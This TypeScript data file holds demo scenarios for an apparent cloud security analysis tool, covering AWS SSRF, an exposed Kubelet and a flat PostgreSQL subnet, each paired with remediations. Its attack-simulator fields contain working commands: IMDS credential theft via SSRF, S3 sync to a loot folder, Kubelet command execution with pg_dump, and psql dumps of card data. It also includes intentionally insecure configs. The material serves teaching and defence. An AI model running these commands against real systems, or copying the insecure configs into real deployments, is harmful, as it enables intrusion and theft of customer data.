import { DualAnalysisResponse } from "../types";

export interface TechScenario {
  id: string;
  name: string;
  category: "AWS" | "Kubernetes" | "Hybrid Cloud";
  description: string;
  rawInput: string;
  analysis: DualAnalysisResponse;
}

export const SCENARIOS: TechScenario[] = [
  {
    id: "aws-ssrf",
    name: "AWS SSRF via IMDSv1 to S3 Exfiltration",
    category: "AWS",
    description: "A public-facing application server deployed on AWS EC2 with IMDSv1 enabled and an overly permissive IAM profile, exposing sensitive customer transaction S3 buckets.",
    rawInput: `# Terraform Infrastructure Definition
resource "aws_instance" "web_server" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.medium"
  
  # Crucial Gaps: Enable IMDSv1 (Tokens optional)
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional" # Non-compliant with modern standards
    http_put_response_hop_limit = 1
  }

  iam_instance_profile = aws_iam_instance_profile.web_profile.name
  security_groups      = [aws_security_group.web_sg.name]
}

resource "aws_iam_role_policy" "wildcard_s3_read" {
  name = "s3_read_policy"
  role = aws_iam_role.web_role.id

  # Non-compliant S3 Access Policy (Wildcards allow full tenant read)
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action   = ["s3:*"]
        Effect   = "Allow"
        Resource = "*"
      }
    ]
  })
}

resource "aws_security_group" "web_sg" {
  name        = "web-server-sg"
  description = "Public HTTP/HTTPS traffic"

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  
  # SSH exposed to management interface
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # CIS 2.1 Failure: SSH exposed publicly
  }
}

resource "aws_s3_bucket" "sensitive_data" {
  bucket = "customer-transaction-store-prod"
  
  # S3 bucket permissions are wide-open
}

resource "aws_s3_bucket_public_access_block" "block_public" {
  bucket = aws_s3_bucket.sensitive_data.id

  # Non-compliant: Public access block turned off!
  block_public_acls       = false
  block_public_policy     = false
  restrict_public_buckets = false
}
`,
    analysis: {
      assetMap: {
        nodes: [
          {
            id: "internet",
            label: "Public Internet",
            type: "internet",
            status: "secure",
            properties: { "Scope": "Inbound Traffic", "Protocol": "Any" },
            description: "Default gateway representing unrestricted global traffic"
          },
          {
            id: "web_server",
            label: "EC2 Web Server (web-prod)",
            type: "compute",
            status: "vulnerable",
            properties: { 
              "Private IP": "10.0.1.15", 
              "Public IP": "54.210.43.12",
              "IMDS Version": "v1 (tokens optional)",
              "OS": "Ubuntu Linux 22.04 LTS"
            },
            description: "Public-facing application node. Contains SSRF vector via vulnerable Node.js reverse-proxy routing configuration."
          },
          {
            id: "web_sg",
            label: "Security Group (web_sg)",
            type: "network",
            status: "vulnerable",
            properties: { "Port 80": "0.0.0.0/0", "Port 22": "0.0.0.0/0 (Global)" },
            description: "Defines entry boundaries. Exposed SSH management port globally creates potential SSH brute-forcing vulnerability."
          },
          {
            id: "iam_role",
            label: "IAM Profile (web_role)",
            type: "iam",
            status: "compromised",
            properties: { "Permissions": "s3:* on resource *", "Principal": "ec2.amazonaws.com" },
            description: "AWS IAM role mapped to the web server EC2 instance. Violates least-privileged authorization concepts."
          },
          {
            id: "s3_bucket",
            label: "S3 Bucket (customer-transaction-store)",
            type: "storage",
            status: "vulnerable",
            properties: { 
              "Encryption": "Disabled", 
              "Public Blocks": "Disabled", 
              "ARN": "arn:aws:s3:::customer-transaction-store-prod" 
            },
            description: "Stores PDF logs of company financial transfers. Lacks default server-side KMS encryption."
          }
        ],
        edges: [
          {
            id: "edge-1",
            source: "internet",
            target: "web_server",
            label: "HTTP Ingress (TCP 80)",
            type: "network"
          },
          {
            id: "edge-2",
            source: "internet",
            target: "web_server",
            label: "SSH Inbound (TCP 22)",
            type: "vulnerability",
            severity: "high"
          },
          {
            id: "edge-3",
            source: "web_server",
            target: "iam_role",
            label: "Assumes Instance Profile",
            type: "iam_access"
          },
          {
            id: "edge-4",
            source: "iam_role",
            target: "s3_bucket",
            label: "Read/Write S3 Assets (Wildcard)",
            type: "iam_access",
            severity: "critical"
          }
        ]
      },
      violations: [
        {
          id: "viol-1",
          framework: "NIST SP 800-53",
          code: "AC-6",
          title: "Least Privilege Enforcement",
          description: "IAM Role contains S3 wildcard action 's3:*' and wildcard target resource '*'. Allows the web application to perform administrative operations (creation, deletions) on all database objects in the tenant pool rather than restricting read operations to defined target parameters.",
          severity: "high",
          targetNodeId: "iam_role",
          status: "FAIL"
        },
        {
          id: "viol-2",
          framework: "ISO/IEC 27001",
          code: "A.12.6.1",
          title: "Technical Vulnerability Management",
          description: "Instance Metadata Service v1 (IMDSv1) is configured. Attacking nodes can bypass standard authentication mechanisms by forcing server-side requests to return sensitive system authorization tokens without requiring challenge handshake validations.",
          severity: "critical",
          targetNodeId: "web_server",
          status: "FAIL"
        },
        {
          id: "viol-3",
          framework: "SOC 2 Type II",
          code: "CC6.6",
          title: "Boundary Defense - Transmission Isolation",
          description: "SSH port 22 is exposed to the global public segment '0.0.0.0/0'. Creating potential access surfaces for automated brute-forcing attacks or denial of service targeting the hypervisor console.",
          severity: "medium",
          targetNodeId: "web_sg",
          status: "FAIL"
        },
        {
          id: "viol-4",
          framework: "CIS Benchmarks",
          code: "AWS S3 2.1.1",
          title: "Enforce Public Bucket Off-limits",
          description: "The S3 public access block configuration has been set to false. Exposes the raw file path headers and objects to indexing bots and global web requests.",
          severity: "high",
          targetNodeId: "s3_bucket",
          status: "FAIL"
        }
      ],
      attackPaths: [
        {
          id: "path-1",
          title: "SSRF Key Steal & Object Exfiltration Loop",
          mitreTechniques: [
            "T1190 - Exploit Public-Facing Application",
            "T1552.005 - Private Keys via Cloud Metadata Service",
            "T1114 - Email/Data Collection",
            "T1048 - Exfiltration Over Alternative Protocol"
          ],
          steps: [
            {
              stepNumber: 1,
              nodeId: "web_server",
              action: "Exploit HTTP Reverse Proxy redirect configuration",
              explanation: "The attacker craft a specific URL payload request (e.g. ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web_role) to bypass boundary proxy mappings."
            },
            {
              stepNumber: 2,
              nodeId: "web_server",
              action: "Extract Temporary IAM Token from metadata",
              explanation: "Because the machine runs IMDSv1, it does not validate PUT requests/headers or tokens. It yields AWS ACCESS KEY ID and SECRET ACCESS KEY instantly back in the response body."
            },
            {
              stepNumber: 3,
              nodeId: "iam_role",
              action: "Assume Token Permissions on AWS CLI",
              explanation: "The hacker copies the temporary token keys to their own terminal, instantly assuming the wildcard permissions granted by the IAM Instance Profile."
            },
            {
              stepNumber: 4,
              nodeId: "s3_bucket",
              action: "Copy Customer Transaction Blobs Securely",
              explanation: "Using the AWS CLI program 'aws s3 sync s3://customer-transaction-store-prod/ . --region=us-east-1', the hacker downloads all confidential client transaction matrices without raising inline alarms."
            }
          ],
          exfiltrationTargetId: "s3_bucket",
          impactDescription: "Corporate finance details compromised, leading to regulatory reporting mandates, heavy GDPR/NIST compliance non-conformity fines, and loss of client trust.",
          exploitPayloadSimulator: `# --- Theoretical Attack Twin Exploit Vector Proof-of-Concept ---
# Step 1: Probe the web app endpoint for SSRF parameters
curl -s -X GET "http://54.210.43.12/proxy?url=http://169.254.169.254/latest/meta-data/"
# Returns directories. Notice: iam/ is exposed since IMDSv1 requires no token headers!

# Step 2: Grab the role credentials
AWS_CREDS=$(curl -s "http://54.210.43.12/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web_role")
export AWS_ACCESS_KEY_ID=$(echo $AWS_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $AWS_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $AWS_CREDS | jq -r '.Token')

# Step 3: Run secure exfiltration pipeline command
aws s3 ls s3://customer-transaction-store-prod/
aws s3 sync s3://customer-transaction-store-prod/ loot/`
        }
      ],
      remediations: [
        {
          id: "rem-1",
          targetNodeId: "web_server",
          frameworkCode: "A.12.6.1",
          title: "Force IMDSv2 (Token Enforcement)",
          filename: "main.tf",
          language: "hcl",
          originalCode: `  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 1
  }`,
          remediatedCode: `  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required" # Enforces secure token generation (IMDSv2)
    http_put_response_hop_limit = 1          # Keeps network boundaries rigid
  }`,
          explanation: "IMDSv2 mandates a token-based authentication session via PUT headers. Attackers exploiting standard blind SSRF proxy requests cannot retrieve cloud session keys because they can't inject session verification metadata headers into the raw forward pipeline."
        },
        {
          id: "rem-2",
          targetNodeId: "iam_role",
          frameworkCode: "AC-6",
          title: "Limit IAM Policy Scope (Least Privilege)",
          filename: "main.tf",
          language: "hcl",
          originalCode: `    Statement = [
      {
        Action   = ["s3:*"]
        Effect   = "Allow"
        Resource = "*"
      }
    ]`,
          remediatedCode: `    Statement = [
      {
        Action   = [
          "s3:GetObject",
          "s3:ListBucket"
        ]
        Effect   = "Allow"
        Resource = [
          "arn:aws:s3:::customer-transaction-store-prod",
          "arn:aws:s3:::customer-transaction-store-prod/*"
        ]
      }
    ]`,
          explanation: "Narrowing permissions limits exposure. If an application key is stolen, the attacker can only execute static 'Read' operations on the specific resource database bucket, rather than gaining global control of the cloud storage infrastructure."
        },
        {
          id: "rem-3",
          targetNodeId: "web_sg",
          frameworkCode: "CC6.6",
          title: "Restrict SSH Access Control",
          filename: "main.tf",
          language: "hcl",
          originalCode: `  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }`,
          remediatedCode: `  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["192.168.10.0/24"] # Restricts access to corporate VPN IP pool only
  }`,
          explanation: "Restricting external SSH inputs blocks automated script brute force attempts from locating active SSH listeners."
        }
      ]
    }
  },
  {
    id: "k8s-kubelet",
    name: "Kubernetes Ingress Exposure & Unauthorized Kubelet Access",
    category: "Kubernetes",
    description: "An exposed Kubernetes clusters showing insecure Kubelet ports (10250) open to anonymous auth, permitting a cyber hacker to compromise container memory clusters.",
    rawInput: `# Kubernetes Workload deployment & RBAC definition
apiVersion: apps/v1
kind: Deployment
metadata:
  name: billing-pod-controller
spec:
  replicas: 1
  template:
    spec:
      containers:
      - name: processor-app
        image: billing:v1.3
        env:
        - name: DATABASE_PASSWORD
          value: "SuperSecretMasterDbPass123" # Hardcoded Secret Exposure
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-admin-binding
subjects:
- kind: Group
  name: system:unauthenticated # Critical Security Gap (Allows Anonymous Cluster Control)
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
`,
    analysis: {
      assetMap: {
        nodes: [
          {
            id: "internet",
            label: "Public Internet",
            type: "internet",
            status: "secure",
            properties: { "Port Exposure": "Insecure Ports" }
          },
          {
            id: "kubelet",
            label: "Kubelet API Server (NodePort 10250)",
            type: "compute",
            status: "vulnerable",
            properties: { "Authentication": "Anonymous Active", "Port": "10250" },
            description: "System supervisor service daemon that hosts local pod scheduling logs and handles shell instructions."
          },
          {
            id: "billing_pod",
            label: "Pod: billing-pod-controller",
            type: "compute",
            status: "compromised",
            properties: { "Secrets": "Exposed in Env variable", "Status": "Active" },
            description: "Crucial service node executing financial database checks. Houses critical configurations in standard raw environmental arrays."
          },
          {
            id: "secrets_db",
            label: "Vault / Database Pod",
            type: "database",
            status: "vulnerable",
            properties: { "Secure Store": "No protection parameters", "Access": "VPC Cluster Range" },
            description: "Local pod holding historical customer audit statements."
          }
        ],
        edges: [
          {
            id: "k8s-edge-1",
            source: "internet",
            target: "kubelet",
            label: "Port 10250 Query (No Token)",
            type: "vulnerability",
            severity: "critical"
          },
          {
            id: "k8s-edge-2",
            source: "kubelet",
            target: "billing_pod",
            label: "Exec Container Shell",
            type: "vulnerability",
            severity: "high"
          },
          {
            id: "k8s-edge-3",
            source: "billing_pod",
            target: "secrets_db",
            label: "Env DB Credentials Login",
            type: "iam_access",
            severity: "high"
          }
        ]
      },
      violations: [
        {
          id: "kviol-1",
          framework: "CIS Benchmarks",
          code: "Kubernetes 1.6.1",
          title: "Kubelet Anonymous Authentication Check",
          description: "Kubelet anonymous auth is configured as active. Permits standard external packets to query sensitive nodes, examine active environment configurations, and trigger remote instruction command buffers.",
          severity: "critical",
          targetNodeId: "kubelet",
          status: "FAIL"
        },
        {
          id: "kviol-2",
          framework: "NIST SP 800-53",
          code: "IA-2",
          title: "Identification and Authentication",
          description: "Cluster configuration maps the Group 'system:unauthenticated' to the ClusterRole 'cluster-admin'. This leaves the cluster completely defenseless, allowing any anonymous user to obtain root cluster privileges.",
          severity: "critical",
          targetNodeId: "kubelet",
          status: "FAIL"
        },
        {
          id: "kviol-3",
          framework: "SOC 2 Type II",
          code: "CC6.1",
          title: "Secure Key Storage and Secret Ingestion",
          description: "Database passwords are saved as plaintext environment variables inside the Kubernetes pod configuration profile instead of mapping targets to dynamic Secret resources.",
          severity: "high",
          targetNodeId: "billing_pod",
          status: "FAIL"
        }
      ],
      attackPaths: [
        {
          id: "path-k8s",
          title: "Anonymous Cluster Takeover",
          mitreTechniques: [
            "T1190 - Exploit Public-Facing Application",
            "T1528 - Steal Application Tokens",
            "T1210 - Exploitation of Remote Services"
          ],
          steps: [
            {
              stepNumber: 1,
              nodeId: "kubelet",
              action: "Probe unauthenticated Kubelet port 10250",
              explanation: "Hacker checks if the endpoint binds /runningpods/ or certificates to authorize inputs. Since anonymous input is active, it reports active node systems structural namespaces."
            },
            {
              stepNumber: 2,
              nodeId: "billing_pod",
              action: "Spawn backend interactive shell control path",
              explanation: "Hacker sends an inline curl POST container execution request directly hitting Kubelet execution hooks to spawn standard Bash inside billing_pod."
            },
            {
              stepNumber: 3,
              nodeId: "billing_pod",
              action: "Dump environmental system registers and arrays",
              explanation: "Hacker runs the standard command 'env' inside the active memory terminal, reading the plaintext credentials 'DATABASE_PASSWORD=SuperSecretMasterDbPass123' instantly."
            },
            {
              stepNumber: 4,
              nodeId: "secrets_db",
              action: "Direct Connection into backend records database",
              explanation: "Leveraging database client binaries within the pod cluster, the attacker executes arbitrary table summaries to steal confidential account parameters."
            }
          ],
          exfiltrationTargetId: "secrets_db",
          impactDescription: "Corporate transactional system compromised. Entire cluster namespace compromised, presenting lateral network pivot opportunities to reach shared VPC cloud instances.",
          exploitPayloadSimulator: `# --- Theoretical Attack Twin Kubelet Exploitation Script ---
# Step 1: Query the unauthenticated Kubelet port to list active running pods
curl -k https://target-node-ip:10250/pods

# Step 2: Inject shell command execution through the Kubelet API endpoint
curl -k -X POST "https://target-node-ip:10250/run/default/billing-pod-controller/processor-app" \\
  -d "cmd=printenv"
# Yields: DATABASE_PASSWORD=SuperSecretMasterDbPass123

# Step 3: Run full exfiltration dumping tables using stolen password credentials 
curl -k -X POST "https://target-node-ip:10250/run/default/billing-pod-controller/processor-app" \\
  -d "cmd=pg_dump -U root_billing_db -h secrets-db billing_prod_db"`
        }
      ],
      remediations: [
        {
          id: "krem-1",
          targetNodeId: "kubelet",
          frameworkCode: "Kubernetes 1.6.1",
          title: "Configure Closed Authentication on Kubelet Port",
          filename: "kubelet-config.yaml",
          language: "yaml",
          originalCode: `apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-admin-binding
subjects:
- kind: Group
  name: system:unauthenticated`,
          remediatedCode: `# Step 1: Remove unauthenticated cluster-admin roles immediately!
# Step 2: Configure your node kubelet-config.yaml with explicit authentication constraints:
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: false # Ensure anonymous packets are strictly blocked
  webhook:
    enabled: true  # Rely on API Server Token verification
authorization:
  mode: Webhook    # Enforce detailed RBAC checks`,
          explanation: "Disabling anonymous-auth blocks unauthenticated HTTP requests made to the ports. Every inbound packet is audited against active service access tokens before instruction execution."
        },
        {
          id: "krem-2",
          targetNodeId: "billing_pod",
          frameworkCode: "CC6.1",
          title: "Utilize Secret Objects and Environment Refs",
          filename: "deployment.yaml",
          language: "yaml",
          originalCode: `        env:
        - name: DATABASE_PASSWORD
          value: "SuperSecretMasterDbPass123"`,
          remediatedCode: `        env:
        - name: DATABASE_PASSWORD
          valueFrom:
            secretKeyRef:
              name: database-credentials
              key: root-db-key # Map context securely using dynamic secrets manager`,
          explanation: "Mapping parameters using secret refs keeps sensitive values encrypted in the etcd keystore, preventing accidental leaks through standard code logs or deployment scripts."
        }
      ]
    }
  },
  {
    id: "db-pivot",
    name: "Flat Subnet PostgreSQL & Lateral Pivoting Surface",
    category: "Hybrid Cloud",
    description: "Database configurations lacking network boundary partitions. A PostgreSQL server shares a subnet with a web server, letting an attacker pivot laterally into core databases.",
    rawInput: `# Database Network Access Config (PostgreSQL pg_hba.conf)
# ALLOW ALL database connections from any external source globally
host    all             all             0.0.0.0/0               md5

# AWS/Azure Flat Infrastructure Segment Definition
resource "aws_subnet" "flat_subnet_one" {
  cidr_block = "10.0.1.0/24"
}

resource "aws_instance" "web_tier" {
  subnet_id = aws_subnet.flat_subnet_one.id
}

resource "aws_db_instance" "flat_database" {
  # Fatal architectural mistake: database lives directly next to web nodes
  # on a public route, instead of isolated in decoupled private tiers.
  publicly_accessible = true
  subnet_id           = aws_subnet.flat_subnet_one.id
}
`,
    analysis: {
      assetMap: {
        nodes: [
          {
            id: "internet",
            label: "Public Internet",
            type: "internet",
            status: "secure",
            properties: { "Port Scope": "Open 5432" }
          },
          {
            id: "web_tier",
            label: "Web Server (VM)",
            type: "compute",
            status: "compromised",
            properties: { "Flat Subnet IP": "10.0.1.4", "Role": "Worker Node" },
            description: "Host server runs public facing forums. Subject to standard unpatched SQL injections or dependency vulnerabilities."
          },
          {
            id: "db_tier",
            label: "Production PostgreSQL RDS",
            type: "database",
            status: "vulnerable",
            properties: { "Subnet CIDR": "10.0.1.0/24", "Exposed Publicly": "True" },
            description: "Stores application state, customer session tokens, and credit card details. Directly exposed on public route loops."
          }
        ],
        edges: [
          {
            id: "db-edge-1",
            source: "internet",
            target: "db_tier",
            label: "TCP 5432 Ingress (Unrestricted)",
            type: "vulnerability",
            severity: "high"
          },
          {
            id: "db-edge-2",
            source: "web_tier",
            target: "db_tier",
            label: "Lateral Subnet Conn (Flat Route)",
            type: "vulnerability",
            severity: "critical"
          }
        ]
      },
      violations: [
        {
          id: "dbviol-1",
          framework: "NIST SP 800-53",
          code: "SC-7",
          title: "Boundary Protection & Security Partitioning",
          description: "Production DBMS is running directly on a public subnet alongside web proxies. Violated structural design mandates requiring isolation of database tiers in private, non-routable interfaces.",
          severity: "high",
          targetNodeId: "db_tier",
          status: "FAIL"
        },
        {
          id: "dbviol-2",
          framework: "ISO/IEC 27001",
          code: "A.13.1.1",
          title: "Network Controls & Segregation",
          description: "Database credentials configuration 'pg_hba.conf' allows ingress from '0.0.0.0/0'. This exposes SQL access interfaces globally to scanning bots.",
          severity: "high",
          targetNodeId: "db_tier",
          status: "FAIL"
        }
      ],
      attackPaths: [
        {
          id: "path-db",
          title: "VPC Lateral Segment Pivoting",
          mitreTechniques: [
            "T1190 - Exploit Public-Facing Application",
            "T1021.006 - Lateral Movement: Remote Services",
            "T1078 - Valid Accounts Usage"
          ],
          steps: [
            {
              stepNumber: 1,
              nodeId: "web_tier",
              action: "Exploit CVE on PHP application node",
              explanation: "Hacker exploits a standard remote code execution (RCE) vulnerability inside the forum backend, spawning a shell on 10.0.1.4."
            },
            {
              stepNumber: 2,
              nodeId: "web_tier",
              action: "Run local network scanning scripts",
              explanation: "Attacker maps active host endpoints inside the shared 10.0.1.0/24 subnet, immediately discovering the database server on port 5432."
            },
            {
              stepNumber: 3,
              nodeId: "db_tier",
              action: "Connect directly to the database portal",
              explanation: "Hacker runs psql on the web host and connects directly. Since they share a flat boundary segment and credentials are weak, connection gets cleared instantly."
            }
          ],
          exfiltrationTargetId: "db_tier",
          impactDescription: "Total leakage of production schemas. Arbitrary system commands execute on database servers with high privilege.",
          exploitPayloadSimulator: `# --- Theoretical Attack Twin Lateral Movement Simulation ---
# From host 10.0.1.4, scan adjacent systems on the private segment
nmap -p 5432 10.0.1.0/24

# Connect directly using the local network routing pathways
psql -h 10.0.1.99 -U master_admin -d prod_vault_db -c "SELECT * FROM users_credit_cards;"`
        }
      ],
      remediations: [
        {
          id: "dbrem-1",
          targetNodeId: "db_tier",
          frameworkCode: "SC-7",
          title: "Segment Systems using Private Subnets (DB Isolation)",
          filename: "main.tf",
          language: "hcl",
          originalCode: `resource "aws_db_instance" "flat_database" {
  publicly_accessible = true
  subnet_id           = aws_subnet.flat_subnet_one.id
}`,
          remediatedCode: `# Step 1: Deploy a private subnet architecture
resource "aws_subnet" "private_db_subnet" {
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.2.0/24"
  map_public_ip_on_launch = false # Restricts assignment of public IPs
}

# Step 2: Migrate DB to private subnet cluster
resource "aws_db_instance" "flat_database" {
  publicly_accessible = false # Block direct public routing
  db_subnet_group_name = aws_db_subnet_group.private_group.name
}`,
          explanation: "Isolating database clusters in dedicated private subnets completely blocks ingress from non-VPC external routing lines, stopping unauthorized connections at physical network boundaries."
        },
        {
          id: "dbrem-2",
          targetNodeId: "db_tier",
          frameworkCode: "A.13.1.1",
          title: "Configure Closed PostgreSQL Authentication Matrix",
          filename: "pg_hba.conf",
          language: "plaintext",
          originalCode: "host    all             all             0.0.0.0/0               md5",
          remediatedCode: `# Restrict ingress ONLY to IP addresses originating from Web servers CIDR subnets
host    all             all             10.0.1.0/24            md5`,
          explanation: "Setting precise source network segments in pg_hba.conf filters database connections at the application layer, ensuring only approved, authenticated subnet systems can start handshakes."
        }
      ]
    }
  }
];
export function getScenarioById(id: string): TechScenario {
  return SCENARIOS.find((s) => s.id === id) || SCENARIOS[0];
}
